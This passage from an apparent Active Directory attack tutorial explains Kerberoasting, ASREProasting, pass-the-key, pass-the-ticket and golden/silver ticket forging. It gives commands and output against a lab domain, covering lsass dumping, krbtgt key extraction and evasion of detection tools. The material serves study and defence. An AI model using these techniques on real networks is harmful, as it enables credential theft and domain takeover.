693d87d9d7f7c7369ea620d886affea1e1cfbcb216d9f44ad42fedbc81f71722eccc6b54b00c2e80902a1fe49d06ca099f8db51aa1f2ad9ad761208f38803d0c842bbbcaf0c08259904eebdd4</span></span></code></pre></div>
</div>
<figcaption>
Kerberoast with GetUserSPNs.py
</figcaption>
</figure>
<p>
Once you have the STs, you can try to crack them with <a href="https://hashcat.net/hashcat/">hashcat</a>. In order to
crack them easily, the STs should be requested encrypted with RC4, however
this could be detected as anormal traffic (by solutions like <a href="https://docs.microsoft.com/en-gb/advanced-threat-analytics/what-is-ata">Microsoft ATA</a>)
since most of the requests require the AES256 encryption.</p>
<p>
It is also possible to perform <a href="https://swarm.ptsecurity.com/kerberoasting-without-spns/">Kerberoasting without knowing the services SPNs</a>.
Remember that you can request a Kerberos ticket for different principals in the
domain, including both services and users.</p>
<p>
Therefore, you can request ticket for a given user, that will be encrypted with
the user key. However, it is necessary that the target user has some service
registered in order to retrieve a ticket for it.</p>
<p>
The ST obtained for the user as target principal name is also encrypted with
the user key so it can be used in Kerberoasting. This also could be useful to
brute-force kerberoasteable users in case you are not able to enumerate them
via LDAP, since the principal name of a user without SPNs cannot be resolved. </p>
<p>
In fact this technique is used by the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">impacket GetUserSPNs.py</a> script. It can
also be used with <a href="https://github.com/GhostPack/Rubeus#kerberoast">Rubeus kerberoast</a> command with the <code class="verbatim">/enterprise</code> flag and
<a href="https://gitlab.com/Zer1t0/cerbero/#kerberoast">cerbero kerberoast</a> command.</p>
<p>
Moreover, if you have the <a href="https://docs.microsoft.com/en-gb/windows/win32/adschema/r-validated-spn">Validated-SPN</a> permsission over an user account,
you can add SPNs to that account, making it Kerberoasteable. This way you could
request a ST for that account service and try to crack it. By default, accounts
do not have the Validated-SPN permissions over themselves.</p>
</div>
</div>
<div id="outline-container-asreproast" class="outline-5">
<h5 id="asreproast">
ASREProast
</h5>
<div id="outline-text-asreproast" class="outline-text-5">
<p>
Most of the users needs to perform Kerberos pre-authentication, that means, send
a timestamp encrypted with its Kerberos key to KDC in the AS-REQ message (to
request a TGT).</p>
<p>
However, in rare occasions, Kerberos pre-authentication is disabled for an
account, by setting the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">DONT_REQUIRE_PREAUTH flag</a>. Thus, anyone can impersonate
those accounts by sending a AS-REQ message, and an <a href="https://tools.ietf.org/html/rfc4120#section-5.4.2">AS-REP response</a> will be returned
from the KDC that data encrypted with the user Kerberos key .</p>
<figure>
<div class="src src-asn1">
<pre tabindex="0"><code class="language-asn1" data-lang="asn1">AS-REP          ::= [APPLICATION 11] KDC-REP

KDC-REP         ::= SEQUENCE {
        pvno            [0] INTEGER (5),
        msg-type        [1] INTEGER (11 -- AS --),
        padata          [2] SEQUENCE OF PA-DATA OPTIONAL
        crealm          [3] Realm,
        cname           [4] PrincipalName,
        ticket          [5] Ticket, -- Encrypted with krbtgt key
        enc-part        [6] EncryptedData -- Encrypted with user key

}</code></pre>
</div>
<figcaption>
AS-REP message definition
</figcaption>
</figure>
<p>
You cannot access to the AS-REP data directly, since is encrypted with the user
key (that it is derived from the user password), but can try an offline crack
attack to discover the user password.</p>
<p>
The <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">ASREProast</a> attack consists on identify the users without Kerberos
pre-authentication required and send AS-REQ on their behalf, in order to
retrieve the piece of data encrypted with the user key in the AS-REP message.
Once is get, a offline cracking attack is performed to trying to recover the
user password.</p>
<figure>
<div class="src src-ldap">
<pre tabindex="0"><code class="language-ldap" data-lang="ldap">(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code></pre>
</div>
<figcaption>
LDAP filter for users without Kerberos pre-authentication
</figcaption>
</figure>
<p>
You can use tools like <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket GetNPUsers.py</a> script, the <a href="https://github.com/GhostPack/Rubeus#asreproast">Rubeus asreproast</a>
command or the <a href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast.ps1</a> script to retrieve the AS-REP encrypted data.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ GetNPUsers.py <span style="color:#e6db74">'contoso.local/Anakin:Vader1234!'</span> -dc-ip 192.168.100.2 -outputfile asreproast-hashes.txt
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
</span></span><span style="display:flex;"><span>----  --------  --------------------------  --------------------------  --------
</span></span><span style="display:flex;"><span>han             2020-12-16 10:53:35.177156  2021-05-12 09:19:28.469863  0x410200 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@debian10:~# cat asreproast-hashes.txt 
</span></span><span style="display:flex;"><span>$krb5asrep$23$han@CONTOSO.LOCAL:73eea4275625972c2e224648c4766b5a$1bbdaba56bb6eba4ea8cb565221de2fe2b5a8ade3d1155e33aa4d786624b84a62a100d97412361c851dfbf3d95ce3d047916bc66ddcec557f70b232a1d029f6a889e49e35069494b43e4b00b892d4ccc4d31e0c4970e8aff426eaa6821133e9a2bbef017ef9241c95d0098bfea4fd2b3c2919e1247de05d19db59fec46a81a60f0f89a2d9c105b9e00011387e756cb284b0ba785655526e3ba6c51f3b8eba21e674d4f1b4e93025f9cf0dccb1f86c3247f0b9ebfc663be5510faf2b77d932351ac4899cb77be58271dc01a3304bfd1de6216e04e5d9033859b92fa87438863c2dff112237c2ace8cffbc2dbb57c6</span></span></code></pre></div>
</div>
<figcaption>

</figcaption>
</figure>
<p>
Once you have the user TGT, then you can crack it with <a href="https://hashcat.net/hashcat/">hashcat</a>. You can request
a AS-REP with RC4 encryption in order to crack it more easily.</p>
</div>
</div>
<div id="outline-container-pass-the-key" class="outline-5">
<h5 id="pass-the-key">
Pass the Key/Over Pass the Hash
</h5>
<div id="outline-text-pass-the-key" class="outline-text-5">
<p>
As you may notice, to request a TGT, the user doesn't need to use its password,
but its Kerberos key. Therefore, if an attacker can stealh a Kerberos key (NT
hash or AES keys), it can be used in order to request a TGT on behalf of the
user, without the need to know the user password.</p>
<p>
Commonly in Windows, the Kerberos keys are cached in the lsass process, and them
can be retrieved by using the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#ekeys">mimikatz sekurlsa::ekeys</a> command. Also you can
<a href="https://www.c0d3xpl0it.com/2016/04/extracting-clear-text-passwords-using-procdump-and-mimikatz.html">dump the lsass process</a> with tools like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>, <a href="https://lolbas-project.github.io/#/dump">sqldumper or others</a>, and
extract the keys offline with mimikatz.</p>
<p>
In the case of Linux, the Kerberos keys are stored in <a href="https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html">keytab</a> files in order to
be used for the Kerberos service. The keytab file can be usually found in
<code class="verbatim">/etc/krb5.keytab</code>, or in the value specified by the environment variables
<code class="verbatim">KRB5_KTNAME</code> or <code class="verbatim">KRB5_CLIENT_KTNAME</code>, or specified in the
<a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html">Kerberos configuration file</a> in <code class="verbatim">/etc/krb5.conf</code>.</p>
<p>
When the keytab is located you can copy it to your local machine and/or list its
keys with <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/klist.html">klist</a> (Kerberos MIT) or <a href="https://gitlab.com/Zer1t0/cerbero/#list">cerbero</a>. </p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ klist -k -Ke
</span></span><span style="display:flex;"><span>Keytab name: FILE:/etc/krb5.keytab
</span></span><span style="display:flex;"><span>KVNO Principal
</span></span><span style="display:flex;"><span>---- --------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>   1 r2d2@contoso.local (DEPRECATED:arcfour-hmac)  (0xc49a77fafad6d3a9270a8568fa453003)</span></span></code></pre></div>
</div>
<figcaption>
Reading keytab with klist
</figcaption>
</figure>
<p>
Once you have the Kerberos keys, you can request a TGT in Windows by using
<a href="https://github.com/GhostPack/Rubeus#asktgt">Rubeus asktgt</a> command.</p>
<p>
In a Linux machine the, you can use the <a href="https://malicious.link/post/2018/pass-the-hash-with-kerberos/">MIT Kerberos utils</a> to create a keytab
with the key, and request a TGT, or using the key directly with the
<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py">impacket getTGT.py</a> script or <a href="https://gitlab.com/Zer1t0/cerbero#ask">cerbero ask</a> command.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cerbero ask -u contoso.local/Anakin --aes ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e -k 192.168.100.2 -vv
</span></span><span style="display:flex;"><span>INFO - Request contoso.local/Anakin TGT <span style="color:#66d9ef">for</span> contoso.local
</span></span><span style="display:flex;"><span>INFO - Save contoso.local/Anakin TGT <span style="color:#66d9ef">for</span> contoso.local in /root/Anakin.ccache</span></span></code></pre></div>
</div>
<figcaption>
Pass-The-Key with cerbero
</figcaption>
</figure>
<p>
The Kerberos tickets have two formats: ccache and krb. The ccache is the one
used by Linux machines to store the tickets (usually in files). The krb format
is used in Windows to store the tickets in the lsass memory, and it is also the
format to transmit tickets over the network. You can convert tickets to one
format to another by using the <a href="https://github.com/Zer1t0/ticket_converter">ticket_converter.py</a> script or <a href="https://gitlab.com/Zer1t0/cerbero#convert">cerbero convert</a>
command.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ python ticket_converter.py ~/Anakin.ccache ~/Anakin.krb
</span></span><span style="display:flex;"><span>Converting ccache =&gt; kirbi</span></span></code></pre></div>
</div>
<figcaption>
Convert a ticket with ticket_converter.py
</figcaption>
</figure>
<p>
Additionally, you can calculate the Kerberos keys from the user password by
using the <a href="https://gitlab.com/Zer1t0/cerbero#hash">cerbero hash</a> command. Also the AES keys can be calculated with
<a href="https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372">Get-KerberosAESKey.ps1</a> or the NT hash with a <a href="https://stackoverflow.com/questions/15603628/how-to-calculate-ntlm-hash-in-python#answer-15603809">few python lines</a>.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cerbero hash <span style="color:#e6db74">'Vader1234!'</span> -u contoso.local/Anakin
</span></span><span style="display:flex;"><span>rc4:cdeae556dc28c24b5b7b14e9df5b6e21
</span></span><span style="display:flex;"><span>aes128:18fe293e673950214c67e9f9fe753198
</span></span><span style="display:flex;"><span>aes256:ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e</span></span></code></pre></div>
</div>
<figcaption>
Calculate Kerberos keys with cerbero
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-pass-the-ticket" class="outline-5">
<h5 id="pass-the-ticket">
Pass the Ticket
</h5>
<div id="outline-text-pass-the-ticket" class="outline-text-5">
<p>
The Pass the Ticket technique consists on steal a ticket and the associated
session key and use them to impersonate the user in order to access to resources
or services. Both TGTs and STs can be used, but TGTs are preferred since they
allow to access to any service (by using it to request a ST) on behalf of the
user, whereas the STs are limited to only one service (or more if the
<a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/">SPN is modified</a> to another service of the same user).</p>
<p>
In Windows, the tickets can be found in the lsass process memory, and can be
extracted with <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#tickets">mimikatz sekurlsa::tickets</a> command or <a href="https://github.com/GhostPack/Rubeus#dump">Rubeus dump</a> command. Other
possibility is to dump lsass process with tools like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>,
<a href="https://lolbas-project.github.io/#/dump">sqldumper or others</a>, and extract the tickets offline with mimikatz or <a href="https://github.com/skelsec/pypykatz">pypykatz</a>.
These commands extracts tickets with the krb format.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; .\procdump.exe -accepteula -ma lsass.exe lsass.dmp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ProcDump v10.0 - Sysinternals <span style="color:#66d9ef">process</span> dump utility
</span></span><span style="display:flex;"><span>Copyright (C) <span style="color:#ae81ff">2009</span>-<span style="color:#ae81ff">2020</span> Mark Russinovich and Andrew Richards
</span></span><span style="display:flex;"><span>Sysinternals - www.sysinternals.com
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">17</span>] Dump <span style="color:#ae81ff">1</span> initiated<span style="color:#960050;background-color:#1e0010">:</span> C:\lsass.dmp
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">18</span>] Dump <span style="color:#ae81ff">1</span> writing<span style="color:#960050;background-color:#1e0010">:</span> Estimated dump file size is <span style="color:#ae81ff">34</span> MB.
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">18</span>] Dump <span style="color:#ae81ff">1</span> complete<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">34</span> MB written <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">1.0</span> seconds
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">18</span>] Dump count reached.</span></span></code></pre></div>
</div>
<figcaption>
Dumping lsass memory with procdump
</figcaption>
</figure>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pypykatz lsa minidump lsass.dmp -k /tmp/kerb &gt; output.txt
</span></span><span style="display:flex;"><span>INFO:root:Parsing file lsass.dmp
</span></span><span style="display:flex;"><span>INFO:root:Writing kerberos tickets to /tmp/kerb
</span></span><span style="display:flex;"><span>$ ls /tmp/kerb/
</span></span><span style="display:flex;"><span> lsass.dmp_51a1d3f3.ccache                                                        <span style="color:#e6db74">'TGS_CONTOSO.LOCAL_WS02-7$_WS02-7$_29a9c991.kirbi'</span>
</span></span><span style="display:flex;"><span> lsass.dmp_c9a82a35.ccache                                                         TGT_CONTOSO.LOCAL_anakin_krbtgt_CONTOSO.LOCAL_6483baf5.kirbi
</span></span><span style="display:flex;"><span> TGS_CONTOSO.LOCAL_anakin_LDAP_dc01.contoso.local_contoso.local_f8a46ad5.kirbi    <span style="color:#e6db74">'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_740ef529.kirbi'</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">'TGS_CONTOSO.LOCAL_WS02-7$_cifs_dc01.contoso.local_b9833fa1.kirbi'</span>                <span style="color:#e6db74">'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_77d63cf0.kirbi'</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">'TGS_CONTOSO.LOCAL_WS02-7$_cifs_dc01.contoso.local_bfed6415.kirbi'</span>                <span style="color:#e6db74">'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_7ac74bd6.kirbi'</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">'TGS_CONTOSO.LOCAL_WS02-7$_ldap_dc01.contoso.local_contoso.local_2129bc1c.kirbi'</span>  <span style="color:#e6db74">'TGT_CONTOSO.LOCAL_WS02-7$_krbtgt_CONTOSO.LOCAL_fdb8b40a.kirbi'</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">'TGS_CONTOSO.LOCAL_WS02-7$_LDAP_dc01.contoso.local_contoso.local_719218c6.kirbi'</span></span></span></code></pre></div>
</div>
<figcaption>
Retrieving tickets from lsass dump with pypykatz
</figcaption>
</figure>
<p>
On the other hand, in Linux machines that are part of a domain,
<a href="https://www.delaat.net/rp/2016-2017/p97/report.pdf">tickets are stored in a different way</a>. Tickets usually can be found by default
under the <code class="verbatim">/tmp</code> directory in files with the format <code class="verbatim">krb5cc_%{uid}</code> where uid is
the user uid. To get the tickets, just copy the files (if you have permissions).
However, it is also possible that tickets are stored in the <a href="https://man7.org/linux/man-pages/man7/keyrings.7.html">Linux kernel keys</a>
instead of files, but you can grab them by using <a href="https://github.com/TarlogicSecurity/tickey">tickey</a>.</p>
<p>
In order to be sure <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">where the tickets are stored</a> in a Linux machine, you can
check the <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html">Kerberos configuration file</a> in <code class="verbatim">/etc/krb5.conf</code>. The tickets are
stored in the <a href="https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html">ccache format</a> in Linux machines.</p>
<p>
To <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-windows">use the tickets in a Windows</a> machine, you must inject them into the lsass
process, which can be done with <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#ptt">mimikatz kerberos::ptt</a> command or <a href="https://github.com/GhostPack/Rubeus#ptt">Rubeus ptt</a>
command. These utilities read tickets in the krb format.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS C:\&gt; .\mimikatz.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
</span></span><span style="display:flex;"><span> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
</span></span><span style="display:flex;"><span> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
</span></span><span style="display:flex;"><span> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
</span></span><span style="display:flex;"><span> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
</span></span><span style="display:flex;"><span>  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz # kerberos::ptt pikachu-tgt.kirbi
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * File: 'pikachu-tgt.kirbi': OK</span></span></code></pre></div>
</div>
<figcaption>
Inject TGT into current Windows session
</figcaption>
</figure>
<p>
Once the tickets are injected into the session, you can use any tool to perform
actions by impersonating the user over the network, like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">psexec</a>.</p>
<p>
In Linux, you can <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-linux">use the tickets</a> with the <a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">impacket utilities</a> by pointing with
the <code class="verbatim">KRB5CCNAME</code> environment variable to the ticket file. Then, use the impacket
utilities with the <code>-k -no-pass</code> parameters. Here, tickets in ccache format are
needed.</p>
<p>
To convert tickets between krb (Windows) and ccache (Linux) format, you can use
the <a href="https://github.com/Zer1t0/ticket_converter">ticket_converter.py</a> script or <a href="https://gitlab.com/Zer1t0/cerbero#convert">cerbero convert</a> command.</p>
</div>
</div>
<div id="outline-container-golden-silver-ticket" class="outline-5">
<h5 id="golden-silver-ticket">
Golden/Silver ticket
</h5>
<div id="outline-text-golden-silver-ticket" class="outline-text-5">
<p>
In Active Directory, the Kerberos TGTs are encrypted with the <code class="verbatim">krbtgt</code> account
keys. In case of knowing the keys, custom TGTs, known as <a href="https://en.hackndo.com/kerberos-silver-golden-tickets/#golden-ticket">Golden Tickets</a>, can
be created.</p>
<p>
To get the <code class="verbatim">krbtgt</code> keys, you need to access to the Active Directory
database. You can do this by performing a remote <a href="https://adsecurity.org/?p=1729">dcsync attack</a>, with 
<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync">mimikatz lsadump::dsync</a> command or the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">impacket secretsdump.py</a> script, or by
<a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-ntdsutil">dumping the NTDS.dit file</a> locally with <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)">ntdsutil</a> or <a href="https://docs.microsoft.com/en-gb/windows-server/administration/windows-commands/vssadmin">vssadmin</a>.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ secretsdump.py <span style="color:#e6db74">'contoso.local/Administrator@192.168.100.2'</span> -just-dc-user krbtgt
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password:
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe8b03404a4975e7226caf6162cfccba:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
</span></span><span style="display:flex;"><span>krbtgt:aes256-cts-hmac-sha1-96:5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
</span></span><span style="display:flex;"><span>krbtgt:aes128-cts-hmac-sha1-96:a268f61e103134bb7e975a146ed1f506
</span></span><span style="display:flex;"><span>krbtgt:des-cbc-md5:0e6d79d66b4951cd
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...</span></span></code></pre></div>
</div>
<figcaption>
krbtgt keys retrieved with secretsdump.py
</figcaption>
</figure>
<p>
Likewise, it is possible to create a custom ST for a service, known as
<a href="https://en.hackndo.com/kerberos-silver-golden-tickets/#silver-ticket">Silver Ticket</a>, if we get the Kerberos keys of the service user. The keys for a
service user can be obtained by looking into the <a href="#lsass-credentials">lsass process</a> of the domain
machines where the user is logged on, by performing <a href="#kerberoast">Kerberoast</a>, by 
<a href="#domain-database-dumping">dumping the Active Directory database</a>, etc.</p>
<p>
In both Golden and Silver tickets, it is possible to create the ticket for any
user in the domain, and even for non-existent ones. Moreover, we can give high
privileges to the ticket user by modifying the PAC user groups and including, for
example, the "Domain Admins" group in order to have the privileges of domain
administrators. </p>
<p>
Additionally, we have to sign the ticket PAC with the <code class="verbatim">krbtgt</code> key, but this
cannot be done for Silver Tickets since we just know the user service key, here
a fake signature is used, since is pretty weird for a service to validate with
the DC the PAC signature.</p>
<p>
In order to create Golden and Silver Tickets, you can use the
<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver">mimikatz kerberos::golden</a> command or the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py">impacket ticketer.py</a> script. Then you
can use them as any ticket. If you can, use the AES256 key to avoing
<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Mittal-Evading-MicrosoftATA-for-ActiveDirectory-Domination.pdf">being detected by solutions like ATA</a>.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ticketer.py -domain-sid S-1-5-21-1372086773-2238746523-2939299801 -domain contoso.local Administrator -aes 5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Creating basic skeleton ticket and PAC Infos
</span></span><span style="display:flex;"><span>[*] Customizing ticket for contoso.local/Administrator
</span></span><span style="display:flex;"><span>[*] 	PAC_LOGON_INFO
</span></span><span style="display:flex;"><span>[*] 	PAC_CLIENT_INFO_TYPE
</span></span><span style="display:flex;"><span>[*] 	EncTicketPart
</span></span><span style="display:flex;"><span>[*] 	EncAsRepPart
</span></span><span style="display:flex;"><span>[*] Signing/Encrypting final ticket
</span></span><span style="display:flex;"><span>[*] 	PAC_SERVER_CHECKSUM
</span></span><span style="display:flex;"><span>[*] 	PAC_PRIVSVR_CHECKSUM
</span></span><span style="display:flex;"><span>[*] 	EncTicketPart
</span></span><span style="display:flex;"><span>[*] 	EncASRepPart
</span></span><span style="display:flex;"><span>[*] Saving ticket in Administrator.ccache</span></span></code></pre></div>
</div>
<figcaption>
Create golden ticket with ticketer.py
</figcaption>
</figure>
<p>
Once created, Golden tickets gives you the rights you specify in the ticket,
allowing you to impersonate any user, even non-existent ones, in the domain and
accessing to any service in the domain.</p>
<p>
One thing to keep in mind is that once the Golden ticket is created, is that this
<a href="https://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html">must be used in 20 minutes</a>, otherwise the PAC information will be checked by the
KDC to verify that it is correct.</p>
<p>
On the other hand only allow you to give you rights to access to services of the
user you have get the password. A case of use for Silver tickets is to access
to a computer as admin when you have the computer domain account password. You
has no admin privileges in the machine with its computer domain account, but you
can use its password to build a Silver ticket for its services and impersonate
an administrator.</p>
<p>
Therefore, Silver Tickets can be used to access to service of one user and
Golden Tickets can be used to access to any service in the domain… and more.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-kerberos-across-domains" class="outline-4">
<h4 id="kerberos-across-domains">
Kerberos Across domains
</h4>
<div id="outline-text-kerberos-across-domains" class="outline-text-4">
<p>
Golden Tickets can also be used to <a href="https://adsecurity.org/?p=1640">compromise the entire forest</a>. But, before
going any deeper into that, lets review how Kerberos works across trusted
domains.</p>
<p>
As we have seen before, it is possible for an domain user to access to services
into trusting domains (using incoming or bidirectionals <a href="#trusts">trusts</a>). The process of
accesing external domain resources also requires authentication, that can be
provided by Kerberos.</p>
<p>
However, a KDC (DC) only can issue STs for the services in its domain, so, how
does Kerberos works across domains? Well, it is necessary to ask for a ST to
the external domain DC server, and for that we require a TGT for that
server. The TGT for an external KDC, known as inter-realm TGT, is issued by
our KDC when we ask for a ST for a service in another domain. The steps are the
following:</p>
<figure>
<pre class="example">  KDC foo.com                                                    KDC bar.com
    .---.                                                          .---.
   /   /|                       .---4) TGS-REQ (TGT bar)-------&gt;  /   /|
  .---. |                       |    + SPN: HTTP\srvbar          .---. |
  |   | '                       |    + TGT client &gt; bar.com      |   | '
  |   |/                        |                                |   |/ 
  '---'                         |   .--5) TGS-REP--------------&lt; '---'
  v  ^                          |   | + ST client &gt; HTTP/srvbar
  |  |                          |   |
  |  |                          ^   v                                   .---.
  |  '-2) TGS-REQ (TGT foo)--&lt;  _____                                  /   /|
  |   + SPN: HTTP\srvbar       |     | &lt;----------1) SPNEGO---------&gt; .---. |
  |   + TGT client &gt; foo.com   |_____|                                |   | '
  |                            /:::::/ &gt;----6) AP-REQ---------------&gt; |   |/
  '--3) TGS-REP--------------&gt; client     + ST client &gt; HTTP/srvbar   '---'  
    + TGT client &gt; bar.com    (foo.com)                               srvbar
                                                                    (bar.com)
</pre>
<figcaption>
Kerberos across domains
</figcaption>
</figure>
<ol>
<li>The client/user, from the <code class="verbatim">foo.com</code> domain, uses SPNEGO to negotiate Kerberos
authentication with the desired service, in this case HTTP\srvbar (a web
server in the server srvbar) from the <code class="verbatim">bar.domain</code>.</li>
<li>The client asks for a ST, using its TGT of <code class="verbatim">foo.com</code>, for HTTP\srvbar to its
KDC, by sending a TGS-REQ message.</li>
